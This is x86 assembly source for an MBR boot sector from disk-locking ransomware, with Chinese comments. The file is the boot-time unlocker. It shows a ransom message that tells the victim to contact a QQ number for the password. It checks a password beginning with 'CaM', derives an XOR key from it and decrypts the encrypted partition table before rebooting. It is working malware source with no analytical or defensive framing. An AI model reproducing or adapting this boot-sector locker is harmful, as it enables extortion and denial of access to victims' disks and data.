;加密4个分区项内容，使用密码各BYTE XOR进行加密
;密码必须以CaM开始，防止输入错误密码造成锁定
org 0x7c00
start:	;初始化寄存器
	mov 	ax, cs
	mov 	ds, ax
	mov		ss, ax
	mov 	es, ax
	mov 	sp, 0x100	;开辟0x100字节的堆栈空间
;--------------------------------------------------------------------------------------
main:		;显示Tips
	mov 	bp, Tips
	mov 	cx, Tips_Len
	mov 	ax, 0x1301
	mov 	bx, 0x0c
	mov 	dl, 0
	int		0x10
	
	;验证密码
	mov 	ax, 0xb800	;显示器缓冲
	add		ax, 0xA0
	mov 	ds, ax		;ds的值为0xb8A0 指向显示器缓存
	xor 	cx, cx		;cx = 0
	xor		bx, bx
	
	GetChar:
		xor 	ax, ax	
		int 	0x16
		cmp 	AL, 0x8		;退格键
		jb 	back
		cmp 	al, 0x0d	;回车键，密码输入结束
		je	entry
		mov 	ah, 2		;其他键都当成密码
		mov 	[bx], al	;bx指向输入的密码
		mov 	[bx+1], ah
		xor		al, al
		mov		[bx+2], al
		add		bx, 2		;bx指针加2
		inc		cx			;cx保存已输入的密码位数
		mov		[cs:InputCnt], cx	;保存输入的密码长度
	jmp	GetChar
	back:
		sub 	bx, 2	;bx长度加2
		dec		cx		;cx长度减1
		mov		[cs:InputCnt], cx
		xor		ax, ax
		mov		[bx], ax ;bx保存的密码置0
		jmp GetChar
	entry:
		;逐字符比较
		mov		ax, cs
		mov		es, ax
		xor		bx, bx
		
		mov		al, [ds:bx]
		cmp		al, 'C'
		jne		key_err		;第一位不是C，退出
		add		bx, 2
		mov		al, [ds:bx]
		cmp		al, 'a'
		jne		key_err
		add		bx, 2
		mov		al, [ds:bx]
		cmp		al, 'M'
		jne		key_err
		add		bx, 2
		
		mov		cl, 0xff
		mov		ch, 0
		mov		[cs:XResult], ch
	calc_key:
			mov		al, [ds:bx]		;取一个真正有效的密码
			cmp		al, 0
			je	fixmbr
			xor		[cs:XResult], al
			add		bx, 2
		loop	calc_key
		;密码正确，进行解密工作
		;读取
		fixmbr:
		;fix	0~0x01bd
		;读取
		mov		ax, 0x7e00
		mov		es, ax
		xor		bx, bx
		mov		ah, 0x2		;功能号读入
		mov		al, 0x80	;驱动号
		mov		al, 1		;要读入的扇区数量
		mov		dh, 0		;磁头号
		mov		ch, 0		;柱面
		mov		cl, 3		;扇区
		int		0x13		;es:bx为数据缓冲区
		;改写MBR
		mov		bx, 0x01bd	;第445字节处进行清0操作，标记MBR为未加密状态
		xor		ch, ch
		mov		[es:bx], ch
		mov		bx, 0x01be
		mov		cl, 64
		decrypt:
			mov		al, [es:bx]
			xor		al, [cs:XResult]
			mov		[es:bx], al
			inc		bx
		loop decrypt
		;写回去
		xor		bx, bx
		mov		ah, 0x3		;写回
		mov		dl, 0x80
		mov		al, 1
		mov		dh, 0
		mov		ch, 0
		mov		cl, 1
		int		0x13
		jmp		_REST		;重启计算机
	key_err:
		mov		bx, 0xb800
		add		bx, Tips_Len
		mov		al, 'X'
		mov		[bx], al
		mov		cx, [cs:InputCnt]
		xor		ax, ax
		kk:		;对输入清0
		mov		[bx], ax
		add		bx, 2
		loop	kk
		jmp		start
	;重启计算机
	_REST:
		mov		ax, 0xffff
		push	ax
		mov		ax, 0
		push	ax
		retf
	
data:
XResult:	db 0
InputCnt:	db 0
Tips:		db "Your computer was locked, contact Q:940375606, and I will send u the password"
Tips_Len	equ $-Tips	;#define 	Tips_Len	??
times	510-($-$$)	db 0xF
dw	0xAA55